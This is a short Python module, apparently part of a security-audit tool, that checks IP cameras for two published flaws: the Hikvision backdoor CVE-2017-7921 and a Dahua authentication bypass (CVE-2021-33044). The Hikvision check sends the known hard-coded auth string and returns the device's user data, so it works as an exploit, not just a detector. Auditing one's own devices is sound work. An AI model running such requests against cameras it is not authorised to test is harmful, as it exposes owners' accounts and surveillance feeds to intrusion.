# -*- coding: utf-8 -*-
"""Проверка известных уязвимостей (CVE) на устройстве."""

import requests
from typing import Optional, Dict
from dataclasses import dataclass


@dataclass
class TargetDevice:
    """Целевое устройство для сканирования уязвимостей."""
    ip: str
    port: int = 80
    vendor: Optional[str] = None


class VulnerabilityScanner:
    """Сканирует устройство на наличие известных уязвимостей."""

    def __init__(self, target: TargetDevice):
        self.target = target
        self.logger = __import__('logging').getLogger("SecurityAudit")

    def scan(self) -> Optional[Dict]:
        """
        Запускает проверку известных уязвимостей.
        Возвращает словарь с информацией об уязвимости или None.
        """
        # Hikvision backdoor CVE-2017-7921
        try:
            url = f"http://{self.target.ip}:{self.target.port}/Security/users?auth=YWRtaW46MTEK"
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and 'admin' in r.text:
                self.logger.info("[!] Обнаружена уязвимость Hikvision backdoor (CVE-2017-7921)")
                return {'method': 'CVE-2017-7921', 'data': r.text}
        except:
            pass

        # Dahua auth bypass CVE-2021-33044
        try:
            url = f"http://{self.target.ip}:{self.target.port}/cgi-bin/userLogin"
            data = {'username': 'admin', 'password': 'any', 'session': '00000000'}
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200 and 'success' in r.text.lower():
                self.logger.info("[!] Обнаружена уязвимость Dahua auth bypass (CVE-2021-33044)")
                return {'method': 'CVE-2021-33044'}
        except:
            pass

        return None